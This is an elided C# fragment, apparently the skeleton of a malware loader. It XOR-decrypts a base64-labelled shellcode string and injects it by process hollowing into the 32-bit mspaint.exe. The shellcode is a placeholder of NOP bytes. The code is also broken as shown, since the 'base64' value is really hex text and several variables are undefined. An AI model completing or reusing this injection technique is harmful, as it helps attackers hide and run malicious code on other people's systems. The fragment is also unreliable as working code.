...
namespace program
{
    ...
    {
        public static byte[] target_ = Encoding.ASCII.GetBytes("whoami");
        public static string HollowedProcessX86 = "C:\\Windows\\SysWOW64\\mspaint.exe";
        ...
        {
            string encryptedShellCodeB64 = "0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90";
            byte[] encryptedShellCodeBytes = System.Convert.FromBase64String(encryptedShellCodeB64);
            byte[] shellcode = xor(encryptedShellCodeBytes, System.Text.Encoding.ASCII.GetBytes("***KEY***"));
            ...
            try
            {
                ldr.Load(HollowedProcessX86, finalshellcode);
            }
            catch (Exception e)
            {
